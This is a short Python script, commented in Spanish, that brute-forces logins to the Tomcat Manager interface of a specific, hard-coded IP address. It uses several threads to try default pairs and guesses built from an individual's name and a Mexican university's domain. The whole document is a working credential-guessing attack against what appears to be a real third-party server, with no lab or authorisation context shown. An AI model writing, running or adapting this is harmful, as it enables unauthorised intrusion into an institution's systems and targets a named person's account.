import requests
import base64
from concurrent.futures import ThreadPoolExecutor

class AdvancedBruteForcer:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.found_credentials = []
    
    def try_credentials(self, credential):
        """Intentar un par de credenciales"""
        user, password = credential
        
        try:
            # Probar en Tomcat Manager
            url = f"{self.target}/manager/html"
            response = self.session.get(url, auth=(user, password), timeout=10)
            
            if response.status_code == 200 and 'Tomcat Web Application Manager' in response.text:
                print(f"🎉 CREDENCIALES VÁLIDAS ENCONTRADAS: {user}:{password}")
                self.found_credentials.append((user, password))
                return True
                
        except Exception as e:
            pass
            
        return False
    
    def advanced_brute_force(self):
        """Fuerza bruta avanzada con múltiples combinaciones"""
        print("[+] Iniciando fuerza bruta avanzada...")
        
        # Lista ampliada de credenciales comunes en Tomcat
        credentials = [
            # Usuarios comunes
            ('admin', 'admin'), ('tomcat', 'tomcat'), 
            ('manager', 'manager'), ('admin', 'tomcat'),
            ('hnieto', 'utslp'), ('hnieto', 'hnieto'),
            ('admin', 'utslp'), ('sito', 'sito'),
            ('admin', 'sito'), ('root', 'root'),
            ('admin', 'password'), ('tomcat', 'admin'),
            ('both', 'tomcat'), ('role1', 'role1'),
            ('hnieto', 'password'), ('admin', '123456'),
            
            # Combinaciones basadas en el dominio
            ('hnieto', 'utslp.edu.mx'), ('admin', 'utslp.edu.mx'),
            ('sito', 'utslp'), ('misitio', 'utslp'),
            ('administrator', 'utslp'), ('webmaster', 'utslp'),
            
            # Contraseñas comunes
            ('admin', ''), ('tomcat', ''), ('', 'tomcat'),
            ('admin', 'admin123'), ('tomcat', 'tomcat6'),
            ('admin', 'tomcat6'), ('hnieto', '123456'),
            
            # Combinaciones numéricas
            ('admin', '123'), ('admin', '1234'), 
            ('admin', '12345'), ('admin', '12345678')
        ]
        
        # Usar hilos para mayor velocidad
        with ThreadPoolExecutor(max_workers=5) as executor:
            results = list(executor.map(self.try_credentials, credentials))
        
        if not self.found_credentials:
            print("❌ No se encontraron credenciales válidas")
        else:
            print(f"✅ Se encontraron {len(self.found_credentials)} credenciales válidas")
        
        return self.found_credentials

# Uso del script
brute_forcer = AdvancedBruteForcer("http://189.254.143.102")
brute_forcer.advanced_brute_force()